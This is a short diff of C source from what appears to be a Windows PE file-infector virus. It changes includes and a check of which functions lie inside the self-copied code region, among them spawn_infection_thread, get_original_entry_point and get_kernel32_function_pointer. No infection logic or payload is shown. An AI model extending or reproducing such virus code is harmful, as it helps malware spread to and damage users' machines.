@@ -4,8 +4,9 @@
 #include "checksum.h"
 #include "code_begin.h"
 #include "code_end.h"
-#include "data.h"
-#include "function_list.h"
+#include "delta.h"
+#include "disasm.h"
+#include "function_kernel32.h"
 #include "infect.h"
 #include "infection_thread.h"
 #include "oep.h"
@@ -51,8 +52,9 @@ int main(int argc, char **argv) {
 static uint8_t check_functions(void) {
     return !IN_BOUNDARIES(main) && !IN_BOUNDARIES(check_functions) &&
            IN_BOUNDARIES(get_string) && IN_BOUNDARIES(get_string_length) &&
-           IN_BOUNDARIES(checksum) && IN_BOUNDARIES(fill_function_list) &&
-           IN_BOUNDARIES(get_data) && IN_BOUNDARIES(get_function_by_checksum) &&
+           IN_BOUNDARIES(parse_instruction) &&
+           IN_BOUNDARIES(next_instruction) && IN_BOUNDARIES(checksum) &&
+           IN_BOUNDARIES(get_kernel32_function_pointer) &&
            IN_BOUNDARIES(spawn_infection_thread) &&
            IN_BOUNDARIES(get_original_entry_point) &&
            IN_BOUNDARIES(write_original_entry_point) && IN_BOUNDARIES(is_pe) &&
